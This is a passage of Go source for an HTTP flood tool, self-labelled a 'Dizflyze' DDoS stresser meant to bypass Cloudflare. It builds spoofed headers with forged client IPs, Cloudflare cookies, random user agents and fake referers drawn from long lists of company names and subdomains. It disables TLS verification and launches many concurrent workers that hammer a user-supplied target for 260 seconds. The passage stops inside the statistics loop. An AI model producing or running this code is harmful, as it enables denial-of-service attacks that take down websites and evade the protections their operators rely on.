        "Supercell Oy", "King Digital Entertainment", "Wargaming Group Limited", "NetEase Inc", "Perfect World Co",
        "Bilibili Inc", "Hoyoverse Inc", "Zillow Group Inc", "Redfin Corporation", "Realtor.com",
        "Trulia Inc", "Opendoor Technologies Inc", "Compass Inc", "WeWork Inc", "Regus PLC",
        "IWG PLC", "Knotel Inc", "Coursera Inc", "Udemy Inc", "edX Inc",
        "Khan Academy Inc", "Pluralsight Inc", "Skillshare Inc", "MasterClass Inc", "Duolingo Inc",
        "Rosetta Stone Inc", "Babbel GmbH", "Grammarly Inc", "ProWritingAid Ltd", "Evernote Corporation",
        "Dropbox Inc", "Box Inc", "OneDrive Inc", "iCloud Inc", "Mega Limited",
        "pCloud AG", "Sync.com Inc", "Wix.com Ltd", "Squarespace Inc", "Webflow Inc",
        "WordPress.com", "Joomla Inc", "BigCommerce Inc", "Magento Commerce", "WooCommerce Inc",
        "PrestaShop SA", "Etsy Inc", "Alibaba.com", "Taobao Inc", "Tmall Inc",
        "Mercado Libre Inc", "Zalando SE", "ASOS Plc", "Farfetch Limited", "Wayfair Inc",
        "Overstock.com", "Houzz Inc", "IKEA Group", "Home Depot Inc", "Lowe's Companies Inc",
        "Best Buy Co", "Newegg Inc", "B&H Photo Video", "Micro Center Inc", "Adobe Systems Incorporated",
        "Autodesk Inc", "Unity Software Inc", "Epic Games Inc", "Valve Corporation", "Electronic Arts Inc",
        "Activision Blizzard Inc", "GitHub Inc", "GitLab Inc", "Bitbucket Inc", "JetBrains s.r.o.",
        "MongoDB Inc", "Red Hat Inc", "SUSE Linux GmbH", "Canonical Ltd", "Mozilla Corporation",
        "Apache Software Foundation", "WordPress Foundation", "Drupal Association", "Linux Foundation", "OpenAI Inc",
        "DeepMind Technologies Limited", "Palantir Technologies Inc", "Snowflake Inc", "Databricks Inc", "ServiceNow Inc",
        "Workday Inc", "Zoho Corporation Pvt", "Intuit Inc", "Xero Limited", "Freshworks Inc",
        "Zendesk Inc", "HubSpot Inc", "Mailchimp Inc", "Hootsuite Inc", "Buffer Inc",
        "Sprout Social Inc", "Zscaler Inc", "Okta Inc", "CrowdStrike Holdings Inc", "Palo Alto Networks Inc",
        "Fortinet Inc", "Check Point Software Technologies Ltd", "Symantec Corporation", "McAfee Corp", "Trend Micro Incorporated",
        "VMware Inc", "Citrix Systems Inc", "Nutanix Inc", "Veeam Software Corporation", "Commvault Systems Inc",
        "Twilio Inc", "SendGrid Inc", "Nexmo Inc", "Vonage Holdings Corp", "RingCentral Inc",
        "Confluent Inc", "Elastic NV", "Splunk Inc", "New Relic Inc", "Dynatrace Inc",
        "AppDynamics Inc", "SolarWinds Corporation", "PagerDuty Inc", "DataDog Inc", "Fastly Inc",
        "Vercel Inc", "Netlify Inc", "Heroku Inc", "Render Inc", "Alteryx Inc",
        "Tableau Software LLC", "QlikTech International AB", "Looker Data Sciences", "Sisense Inc", "Domo Inc",
        "ThoughtSpot Inc", "Cognizant Technology Solutions", "Infosys Ltd", "Wipro Ltd", "Tata Consultancy Services Ltd",
        "Accenture PLC", "Capgemini SE", "DXC Technology Company", "NTT Data Corporation", "Fujitsu Ltd",
        "Hitachi Ltd", "NEC Corporation", "Toshiba Corporation", "Mitsubishi Electric Corporation", "Siemens AG",
        "Ericsson AB", "Nokia Corporation", "ZTE Corporation", "Rakuten Group Inc", "SoftBank Group Corp",
        "Square Enix Holdings Co", "Bandai Namco Entertainment Inc", "Sega Corporation", "Konami Holdings Corporation", "Capcom Co Ltd",
        "Ubisoft Entertainment SA", "Take-Two Interactive Software", "Riot Games Inc", "Cloud Imperium Games Corporation", "Niantic Inc",
        "Rovio Entertainment Corporation", "Supercell Oy", "King Digital Entertainment", "Wargaming Group Limited", "NetEase Inc",
        "Perfect World Co", "Bilibili Inc", "Hoyoverse Inc", "Zillow Group Inc", "Redfin Corporation",
        "Realtor.com", "Trulia Inc", "Opendoor Technologies Inc", "Compass Inc", "WeWork Inc",
        "Regus PLC", "IWG PLC", "Knotel Inc", "Coursera Inc", "Udemy Inc",
        "edX Inc", "Khan Academy Inc", "Pluralsight Inc", "Skillshare Inc", "MasterClass Inc",
        "Duolingo Inc", "Rosetta Stone Inc", "Babbel GmbH", "Grammarly Inc", "ProWritingAid Ltd",
        "Evernote Corporation", "Dropbox Inc", "Box Inc", "OneDrive Inc", "iCloud Inc",
        "Mega Limited", "pCloud AG", "Sync.com Inc", "Wix.com Ltd", "Squarespace Inc",
        "Webflow Inc", "WordPress.com", "Joomla Inc", "BigCommerce Inc", "Magento Commerce",
        "WooCommerce Inc", "PrestaShop SA", "Etsy Inc", "Alibaba.com", "Taobao Inc",
        "Tmall Inc", "Mercado Libre Inc", "Zalando SE", "ASOS Plc", "Farfetch Limited",
        "Wayfair Inc", "Overstock.com", "Houzz Inc", "IKEA Group", "Home Depot Inc",
        "Lowe's Companies Inc", "Best Buy Co", "Newegg Inc", "B&H Photo Video", "Micro Center Inc",
        "Adobe Systems Incorporated", "Autodesk Inc", "Unity Software Inc", "Epic Games Inc", "Valve Corporation",
        "Electronic Arts Inc", "Activision Blizzard Inc", "GitHub Inc", "GitLab Inc", "Bitbucket Inc",
        "JetBrains s.r.o.", "MongoDB Inc", "Red Hat Inc", "SUSE Linux GmbH", "Canonical Ltd",
        "Mozilla Corporation", "Apache Software Foundation", "WordPress Foundation", "Drupal Association", "Linux Foundation",
        "OpenAI Inc", "DeepMind Technologies Limited", "Palantir Technologies Inc", "Snowflake Inc", "Databricks Inc",
        "ServiceNow Inc", "Workday Inc", "Zoho Corporation Pvt", "Intuit Inc", "Xero Limited",
        "Freshworks Inc", "Zendesk Inc", "HubSpot Inc", "Mailchimp Inc", "Hootsuite Inc",
        "Buffer Inc", "Sprout Social Inc", "Zscaler Inc", "Okta Inc", "CrowdStrike Holdings Inc",
        "Palo Alto Networks Inc", "Fortinet Inc", "Check Point Software Technologies Ltd", "Symantec Corporation", "McAfee Corp",
        "Trend Micro Incorporated", "VMware Inc", "Citrix Systems Inc", "Nutanix Inc", "Veeam Software Corporation",
        "Commvault Systems Inc", "Twilio Inc", "SendGrid Inc", "Nexmo Inc", "Vonage Holdings Corp",
        "RingCentral Inc", "Confluent Inc", "Elastic NV", "Splunk Inc", "New Relic Inc",
        "Dynatrace Inc", "AppDynamics Inc", "SolarWinds Corporation", "PagerDuty Inc", "DataDog Inc",
        "Fastly Inc", "Vercel Inc", "Netlify Inc", "Heroku Inc", "Render Inc",
        "Alteryx Inc", "Tableau Software LLC", "QlikTech International AB", "Looker Data Sciences", "Sisense Inc",
        "Domo Inc", "ThoughtSpot Inc", "Cognizant Technology Solutions", "Infosys Ltd", "Wipro Ltd",
        "Tata Consultancy Services Ltd", "Accenture PLC", "Capgemini SE", "DXC Technology Company", "NTT Data Corporation",
        "Fujitsu Ltd", "Hitachi Ltd", "NEC Corporation", "Toshiba Corporation", "Mitsubishi Electric Corporation",
        "Siemens AG", "Ericsson AB", "Nokia Corporation", "ZTE Corporation", "Rakuten Group Inc",
        "SoftBank Group Corp", "Square Enix Holdings Co", "Bandai Namco Entertainment Inc", "Sega Corporation", "Konami Holdings Corporation",
        "Capcom Co Ltd", "Ubisoft Entertainment SA", "Take-Two Interactive Software", "Riot Games Inc", "Cloud Imperium Games Corporation",
        "Niantic Inc", "Rovio Entertainment Corporation", "Supercell Oy", "King Digital Entertainment", "Wargaming Group Limited",
        "NetEase Inc", "Perfect World Co", "Bilibili Inc", "Hoyoverse Inc", "Zillow Group Inc",
        "Redfin Corporation", "Realtor.com", "Trulia Inc", "Opendoor Technologies Inc", "Compass Inc",
        "WeWork Inc", "Regus PLC", "IWG PLC", "Knotel Inc", "Coursera Inc",
        "Udemy Inc", "edX Inc", "Khan Academy Inc", "Pluralsight Inc", "Skillshare Inc",
        "MasterClass Inc", "Duolingo Inc", "Rosetta Stone Inc", "Babbel GmbH", "Grammarly Inc",
        "ProWritingAid Ltd", "Evernote Corporation", "Dropbox Inc", "Box Inc", "OneDrive Inc",
        "iCloud Inc", "Mega Limited", "pCloud AG", "Sync.com Inc", "Wix.com Ltd",
        "Squarespace Inc", "Webflow Inc", "WordPress.com", "Joomla Inc", "BigCommerce Inc",
        "Magento Commerce", "WooCommerce Inc", "PrestaShop SA", "Etsy Inc", "Alibaba.com",
        "Taobao Inc", "Tmall Inc", "Mercado Libre Inc", "Zalando SE", "ASOS Plc",
        "Farfetch Limited", "Wayfair Inc", "Overstock.com", "Houzz Inc", "IKEA Group",
        "Home Depot Inc", "Lowe's Companies Inc", "Best Buy Co", "Newegg Inc", "B&H Photo Video",
        "Micro Center Inc",
	}
}

func initDomains() {
	domains = []string{
        "cdn", "static", "assets", "images", "js", "css", "api", "gateway", "edge", "origin", "lb", "cache",
        "media", "video", "audio", "files", "uploads", "downloads", "content", "stream", "proxy", "auth",
        "login", "signup", "user", "profile", "account", "admin", "dashboard", "metrics", "analytics", "logs",
        "monitor", "alerts", "events", "data", "storage", "backup", "archive", "db", "database", "query",
        "search", "index", "graphql", "rest", "webhook", "socket", "ws", "realtime", "chat", "messaging",
        "notification", "push", "email", "smtp", "mail", "inbox", "outbox", "billing", "payment", "checkout",
        "cart", "store", "shop", "products", "catalog", "inventory", "orders", "shipping", "tracking", "returns",
        "support", "help", "faq", "ticket", "contact", "feedback", "survey", "reviews", "ratings", "comments",
        "blog", "news", "articles", "press", "mediahub", "gallery", "photos", "videos", "portfolio", "projects",
        "jobs", "careers", "hiring", "recruit", "apply", "team", "about", "company", "investors", "partners",
        "resources", "guides", "docs", "api-docs", "tutorials", "learn", "academy", "training", "courses", "edu",
        "community", "forum", "discuss", "groups", "members", "events", "meetups", "webinar", "conference", "live",
        "staging", "test", "dev", "sandbox", "beta", "alpha", "preview", "demo", "trial", "public",
        "private", "internal", "external", "secure", "ssl", "vpn", "firewall", "network", "dns", "resolver",
        "cdn1", "cdn2", "cdn3", "cdn4", "cdn5", "static1", "static2", "static3", "static4", "static5",
        "assets1", "assets2", "assets3", "assets4", "assets5", "images1", "images2", "images3", "images4", "images5",
        "js1", "js2", "js3", "js4", "js5", "css1", "css2", "css3", "css4", "css5",
        "api1", "api2", "api3", "api4", "api5", "gateway1", "gateway2", "gateway3", "gateway4", "gateway5",
        "edge1", "edge2", "edge3", "edge4", "edge5", "origin1", "origin2", "origin3", "origin4", "origin5",
        "lb1", "lb2", "lb3", "lb4", "lb5", "cache1", "cache2", "cache3", "cache4", "cache5",
        "media1", "media2", "media3", "media4", "media5", "video1", "video2", "video3", "video4", "video5",
        "audio1", "audio2", "audio3", "audio4", "audio5", "files1", "files2", "files3", "files4", "files5",
        "uploads1", "uploads2", "uploads3", "uploads4", "uploads5", "downloads1", "downloads2", "downloads3", "downloads4", "downloads5",
        "content1", "content2", "content3", "content4", "content5", "stream1", "stream2", "stream3", "stream4", "stream5",
        "proxy1", "proxy2", "proxy3", "proxy4", "proxy5", "auth1", "auth2", "auth3", "auth4", "auth5",
        "login1", "login2", "login3", "login4", "login5", "signup1", "signup2", "signup3", "signup4", "signup5",
        "user1", "user2", "user3", "user4", "user5", "profile1", "profile2", "profile3", "profile4", "profile5",
        "account1", "account2", "account3", "account4", "account5", "admin1", "admin2", "admin3", "admin4", "admin5",
        "dashboard1", "dashboard2", "dashboard3", "dashboard4", "dashboard5", "metrics1", "metrics2", "metrics3", "metrics4", "metrics5",
        "analytics1", "analytics2", "analytics3", "analytics4", "analytics5", "logs1", "logs2", "logs3", "logs4", "logs5",
        "monitor1", "monitor2", "monitor3", "monitor4", "monitor5", "alerts1", "alerts2", "alerts3", "alerts4", "alerts5",
        "events1", "events2", "events3", "events4", "events5", "data1", "data2", "data3", "data4", "data5",
        "storage1", "storage2", "storage3", "storage4", "storage5", "backup1", "backup2", "backup3", "backup4", "backup5",
        "archive1", "archive2", "archive3", "archive4", "archive5", "db1", "db2", "db3", "db4", "db5",
        "database1", "database2", "database3", "database4", "database5", "query1", "query2", "query3", "query4", "query5",
        "search1", "search2", "search3", "search4", "search5", "index1", "index2", "index3", "index4", "index5",
        "graphql1", "graphql2", "graphql3", "graphql4", "graphql5", "rest1", "rest2", "rest3", "rest4", "rest5",
        "webhook1", "webhook2", "webhook3", "webhook4", "webhook5", "socket1", "socket2", "socket3", "socket4", "socket5",
        "ws1", "ws2", "ws3", "ws4", "ws5", "realtime1", "realtime2", "realtime3", "realtime4", "realtime5",
        "chat1", "chat2", "chat3", "chat4", "chat5", "messaging1", "messaging2", "messaging3", "messaging4", "messaging5",
        "notification1", "notification2", "notification3", "notification4", "notification5", "push1", "push2", "push3", "push4", "push5",
        "email1", "email2", "email3", "email4", "email5", "smtp1", "smtp2", "smtp3", "smtp4", "smtp5",
        "mail1", "mail2", "mail3", "mail4", "mail5", "inbox1", "inbox2", "inbox3", "inbox4", "inbox5",
        "outbox1", "outbox2", "outbox3", "outbox4", "outbox5", "billing1", "billing2", "billing3", "billing4", "billing5",
        "payment1", "payment2", "payment3", "payment4", "payment5", "checkout1", "checkout2", "checkout3", "checkout4", "checkout5",
        "cart1", "cart2", "cart3", "cart4", "cart5", "store1", "store2", "store3", "store4", "store5",
        "shop1", "shop2", "shop3", "shop4", "shop5", "products1", "products2", "products3", "products4", "products5",
        "catalog1", "catalog2", "catalog3", "catalog4", "catalog5", "inventory1", "inventory2", "inventory3", "inventory4", "inventory5",
        "orders1", "orders2", "orders3", "orders4", "orders5", "shipping1", "shipping2", "shipping3", "shipping4", "shipping5",
        "tracking1", "tracking2", "tracking3", "tracking4", "tracking5", "returns1", "returns2", "returns3", "returns4", "returns5",
        "support1", "support2", "support3", "support4", "support5", "help1", "help2", "help3", "help4", "help5",
        "faq1", "faq2", "faq3", "faq4", "faq5", "ticket1", "ticket2", "ticket3", "ticket4", "ticket5",
        "contact1", "contact2", "contact3", "contact4", "contact5", "feedback1", "feedback2", "feedback3", "feedback4", "feedback5",
        "survey1", "survey2", "survey3", "survey4", "survey5", "reviews1", "reviews2", "reviews3", "reviews4", "reviews5",
        "ratings1", "ratings2", "ratings3", "ratings4", "ratings5", "comments1", "comments2", "comments3", "comments4", "comments5",
        "blog1", "blog2", "blog3", "blog4", "blog5", "news1", "news2", "news3", "news4", "news5",
        "articles1", "articles2", "articles3", "articles4", "articles5", "press1", "press2", "press3", "press4", "press5",
        "mediahub1", "mediahub2", "mediahub3", "mediahub4", "mediahub5", "gallery1", "gallery2", "gallery3", "gallery4", "gallery5",
        "photos1", "photos2", "photos3", "photos4", "photos5", "videos1", "videos2", "videos3", "videos4", "videos5",
        "portfolio1", "portfolio2", "portfolio3", "portfolio4", "portfolio5", "projects1", "projects2", "projects3", "projects4", "projects5",
        "jobs1", "jobs2", "jobs3", "jobs4", "jobs5", "careers1", "careers2", "careers3", "careers4", "careers5",
        "hiring1", "hiring2", "hiring3", "hiring4", "hiring5", "recruit1", "recruit2", "recruit3", "recruit4", "recruit5",
        "apply1", "apply2", "apply3", "apply4", "apply5", "team1", "team2", "team3", "team4", "team5",
        "about1", "about2", "about3", "about4", "about5", "company1", "company2", "company3", "company4", "company5",
        "investors1", "investors2", "investors3", "investors4", "investors5", "partners1", "partners2", "partners3", "partners4", "partners5",
        "resources1", "resources2", "resources3", "resources4", "resources5", "guides1", "guides2", "guides3", "guides4", "guides5",
        "docs1", "docs2", "docs3", "docs4", "docs5", "api-docs1", "api-docs2", "api-docs3", "api-docs4", "api-docs5",
        "tutorials1", "tutorials2", "tutorials3", "tutorials4", "tutorials5", "learn1", "learn2", "learn3", "learn4", "learn5",
        "academy1", "academy2", "academy3", "academy4", "academy5", "training1", "training2", "training3", "training4", "training5",
        "courses1", "courses2", "courses3", "courses4", "courses5", "edu1", "edu2", "edu3", "edu4", "edu5",
        "community1", "community2", "community3", "community4", "community5", "forum1", "forum2", "forum3", "forum4", "forum5",
        "discuss1", "discuss2", "discuss3", "discuss4", "discuss5", "groups1", "groups2", "groups3", "groups4", "groups5",
        "members1", "members2", "members3", "members4", "members5", "events1", "events2", "events3", "events4", "events5",
        "meetups1", "meetups2", "meetups3", "meetups4", "meetups5", "webinar1", "webinar2", "webinar3", "webinar4", "webinar5",
        "conference1", "conference2", "conference3", "conference4", "conference5", "live1", "live2", "live3", "live4", "live5",
	}
}

func initPaths() {
	paths = []string{
        "wp-admin", "wp-login", "api", "v2", "graphql",
        "rest", "oauth", "auth", "login", "account",
        "admin", "dashboard", "user", "profile", "settings",
        "signup", "signin", "logout", "register", "password",
        "api/v1", "api/v2", "api/v3", "api/auth", "api/user",
        "blog", "news", "feed", "posts", "comments",
        "search", "query", "explore", "discover", "trending",
        "cart", "checkout", "payment", "order", "shop",
        "products", "items", "store", "catalog", "inventory",
        "media", "files", "uploads", "downloads", "assets",
        "images", "videos", "gallery", "photos", "content",
        "events", "calendar", "schedule", "bookings", "tickets",
        "jobs", "careers", "recruitment", "hiring", "apply",
        "contact", "support", "help", "faq", "feedback",
        "about", "team", "company", "mission", "vision",
        "services", "solutions", "features", "pricing", "plans",
        "portfolio", "projects", "works", "clients", "partners",
        "resources", "guides", "tutorials", "docs", "manual",
        "community", "forum", "chat", "groups", "members",
        "courses", "learn", "education", "training", "lessons",
        "analytics", "stats", "reports", "insights", "data",
        "billing", "invoices", "subscriptions", "payments", "transactions",
        "notifications", "alerts", "messages", "inbox", "outbox",
        "settings/account", "settings/profile", "settings/security", "settings/privacy", "settings/notifications",
        "api/graphql", "api/rest", "api/soap", "api/webhook", "api/public",
        "dev", "developer", "sandbox", "test", "staging",
        "blog/posts", "blog/categories", "blog/tags", "blog/archives", "blog/author",
        "store/products", "store/categories", "store/cart", "store/checkout", "store/orders",
        "user/profile", "user/settings", "user/activity", "user/friends", "user/messages",
        "admin/users", "admin/roles", "admin/permissions", "admin/logs", "admin/settings",
        "public", "private", "internal", "external", "shared",
        "events/upcoming", "events/past", "events/live", "events/register", "events/details",
        "news/latest", "news/featured", "news/categories", "news/archives", "news/subscribe",
        "search/results", "search/advanced", "search/filters", "search/suggestions", "search/history",
        "media/images", "media/videos", "media/audio", "media/documents", "media/stream",
        "shop/new", "shop/popular", "shop/sale", "shop/recommended", "shop/reviews",
        "support/tickets", "support/knowledgebase", "support/livechat", "support/faq", "support/contact",
        "docs/api", "docs/guides", "docs/reference", "docs/examples", "docs/support",
        "community/forums", "community/blogs", "community/events", "community/members", "community/groups",
        "analytics/dashboard", "analytics/reports", "analytics/trends", "analytics/export", "analytics/raw",
        "billing/plans", "billing/invoices", "billing/payments", "billing/history", "billing/upgrade",
        "account/verify", "account/recovery", "account/reset", "account/delete", "account/update",
        "api/v1/users", "api/v1/products", "api/v1/orders", "api/v1/comments", "api/v1/reviews",
        "graphql/query", "graphql/mutation", "graphql/subscription", "graphql/playground", "graphql/docs",
        "web", "mobile", "desktop", "app", "widget",
        "auth/login", "auth/signup", "auth/reset", "auth/verify", "auth/2fa",
        "content/articles", "content/videos", "content/podcasts", "content/guides", "content/newsletters",
	}
}

func GRDN() string {
	if len(domains) == 0 {
		return "example.com"
	}
	return domains[rand.Intn(len(domains))] + ".example.com"
}

func GRPH() string {
	if len(paths) == 0 {
		return "path"
	}
	return paths[rand.Intn(len(paths))] + "/" + GT()[:8]
}

func GROG() string {
	if len(orgs) == 0 {
		return "Unknown Org"
	}
	return orgs[rand.Intn(len(orgs))]
}

func GRIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

func GON() string {
	return GROG()
}

func GFH() string {
	return GRDN()
}

func GFP() string {
	return GRPH()
}

func GRR() string {
	base := referers[rand.Intn(len(referers))]
	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, 12+rand.Intn(20))
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return base + string(b)
}

func L() {
	fmt.Println(Cyan + `
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⣶⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣄⠀
⠀⠀⣴⣶⣶⣶⣶⣶⣾⣿⣿⡿⢿⣿⣿⣦⣤⣤⣤⣤⣤⣤⣶⣿⣿⣿⣿⣷
⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⠋⣿⡏⢹⡟⠉⣿⠉⠀⠀
⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠈⠁⠀⠉⠀⠈⠁⠀⠉⠀⠀⠀
⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣀⡀⠀⠀⣀⣠⣶⣦⠀⠀
⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠉⠛⠿⣿⣿⣿⠿⠟⠋⠀⠀⠀
⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⢀⡀⠀⣀⡀⢀⡀⠀⣀⠀⠀⠀
⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣷⣾⣷⣶⣿⣶⣶⡀
⠀⠻⠿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠿⠛⠛⠋⠀⠀⠀⠀
        ⠀    Dizflyze V6 - Bypass CF 
` + Reset)
}

func GIPD(ip string) (isp, asn, country string) {
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	
	req, _ := http.NewRequestWithContext(ctx, "GET", "http://ip-api.com/json/"+ip, nil)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "Tidak Diketahui", "Tidak Ada", "Invisible"
	}
	defer resp.Body.Close()

	var data struct {
		Country string `json:"country"`
		Org     string `json:"org"`
		AS      string `json:"as"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
		return "Tidak Diketahui", "Tidak Ada", "Invisible"
	}
	return data.Org, data.AS, data.Country
}

func RH(host string) string {
	ips, err := net.LookupIP(host)
	if err != nil || len(ips) == 0 {
		return "Tidak Diketahui"
	}
	return ips[0].String()
}

func GSH() []string {
	headersCopy := make([]string, len(secHeaders))
	copy(headersCopy, secHeaders)
	rand.Shuffle(len(headersCopy), func(i, j int) {
		headersCopy[i], headersCopy[j] = headersCopy[j], headersCopy[i]
	})
	return headersCopy[:20+rand.Intn(15)]
}

func CH2T() *http.Transport {
	return &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
			CipherSuites: []uint16{
				tls.TLS_AES_128_GCM_SHA256,
		    	tls.TLS_AES_256_GCM_SHA384,
				tls.TLS_CHACHA20_POLY1305_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,
				tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
				tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
				tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_RSA_WITH_AES_128_CBC_SHA256,
			},
			CurvePreferences: []tls.CurveID{
				tls.X25519,
				tls.CurveP256,
				tls.CurveP384,
				tls.CurveP521,
			},
			NextProtos:         []string{"h2"},
			ClientSessionCache: tls.NewLRUClientSessionCache(1000),
		},
		DisableKeepAlives:   false,
		MaxIdleConns:        30000,
		MaxIdleConnsPerHost: 30000,
		MaxConnsPerHost:     0,
		IdleConnTimeout:     3 * time.Second,
		DialContext: (&net.Dialer{
			Timeout:   3 * time.Second,
			KeepAlive: 3 * time.Second,
			DualStack: true,
		}).DialContext,
		ForceAttemptHTTP2:     true,
		TLSHandshakeTimeout:   3 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
	}
}

func BAH(host string) http.Header {
	h := http.Header{}
	h.Set("User-Agent", uarand.GetRandom())
	h.Set("Referer", GRR())
	h.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
	h.Set("Accept-Language", "en-US,en;q=0.9,id;q=0.8,ms;q=0.7")
	h.Set("Accept-Encoding", "gzip, deflate, br, zstd")
	h.Set("Cache-Control", "no-cache, no-store, must-revalidate")
	h.Set("Pragma", "no-cache")
	h.Set("Connection", "keep-alive")
	h.Set("DNT", fmt.Sprintf("%d", rand.Intn(2)))
	h.Set("Upgrade-Insecure-Requests", "1")
	h.Set("X-Forwarded-For", GRIP())
	h.Set("X-Requested-With", "XMLHttpRequest")
	h.Set("X-Real-IP", GRIP())
	h.Set("X-Client-Version", "3.2.1")
	h.Set("X-Device-Id", GUUID())
	h.Set("X-Request-Start", fmt.Sprintf("t=%d", time.Now().UnixMicro()))
	h.Set("X-Requested-Domain", host)
	h.Set("X-Content-Type", "application/json")
	h.Set("X-Requested-Protocol", "HTTP/2")
	h.Set("Te", "trailers")
	h.Set("Host", host)
	h.Set("Cookie", fmt.Sprintf("_cfuvid=%x; _ga=GA1.1.%d; _gid=GA1.1.%d; _gat=1; __cf_bm=%s", rand.Uint64(), rand.Uint64(), rand.Uint64(), GT()))
	h.Set("If-Modified-Since", time.Now().Add(-24*time.Hour).Format(time.RFC1123))
	h.Set("If-None-Match", fmt.Sprintf("\"%x\"", rand.Uint64()))
	h.Set("Origin", "https://"+host)
	h.Set("X-Forwarded-Host", host)
	h.Set("X-Host", host)
	h.Set("X-Forwarded-Path", "/")
	h.Set("X-Request-Identifier", GUUID())
	h.Set("CF-IPCountry", countries[rand.Intn(len(countries))])
	h.Set("CF-Connecting-IP", GRIP())
	h.Set("True-Client-IP", GRIP())
	h.Set("X-Forwarded-Proto", "https")
	h.Set("X-Forwarded-Port", "443")
	h.Set("X-Edge-Signature", GT())
	h.Set("X-Api-Fingerprint", GT())
	h.Set("X-Request-Session", GUUID())
	h.Set("X-Browser-Id", GUUID())
	h.Set("X-Session-Id", GUUID())
	h.Set("X-Trace-Id", GUUID())
	h.Set("X-Request-Time", fmt.Sprintf("%d", time.Now().Unix()))
	h.Set("X-Request-Charset", "UTF-8")
	h.Set("X-Requested-By", "XMLHttpRequest")
	h.Set("X-Cloudflare-Client", "enterprise")
	h.Set("X-Cloudflare-IP-Country", countries[rand.Intn(len(countries))])
	h.Set("X-Cloudflare-IP-ASN", fmt.Sprintf("AS%d", 100000+rand.Intn(900000)))
	h.Set("X-Cloudflare-IP-Organization", GON())
	
	for _, header := range GSH() {
		parts := strings.SplitN(header, ":", 2)
		if len(parts) == 2 {
			h.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
		}
	}
	
	return h
}

func AW(target string, host string, wg *sync.WaitGroup, stopChan chan struct{}) {
	defer wg.Done()
	
	client := &http.Client{
		Transport: CH2T(),
		Timeout:   3 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	for {
		select {
		case <-stopChan:
			return
		default:
			req, _ := http.NewRequest("GET", target, nil)
			req.Header = BAH(host)
			
			resp, err := client.Do(req)
			if err == nil {
				atomic.AddInt64(&requests, 1)
				if resp.StatusCode < 500 {
					atomic.AddInt64(&successCount, 1)
				} else {
					atomic.AddInt64(&failedCount, 1)
				}
				resp.Body.Close()
			} else {
				atomic.AddInt64(&failedCount, 1)
			}
		}
	}
}

func main() {
	L()
	reader := bufio.NewReader(os.Stdin)
	fmt.Print(Reset + "╔═[ddos]Dizflyze Streser]\n╚══➤ " + Reset)
	input, _ := reader.ReadString('\n')
	target := strings.TrimSpace(input)

	parsedURL, err := url.Parse(target)
	if err != nil {
		fmt.Println("Tidak Di Kenali : ", err)
		return
	}

	host := parsedURL.Host
	HIP := RH(host)
	ISP, ASN, CHS := GIPD(HIP)

	duration := 260 * time.Second
	stopChan := make(chan struct{})
	var wg sync.WaitGroup

	transport := CH2T()
	http2.ConfigureTransport(transport)

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go AW(target, host, &wg, stopChan)
	}

	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				elapsed := time.Since(startTime)
				total := atomic.LoadInt64(&requests)
				success := atomic.LoadInt64(&successCount)
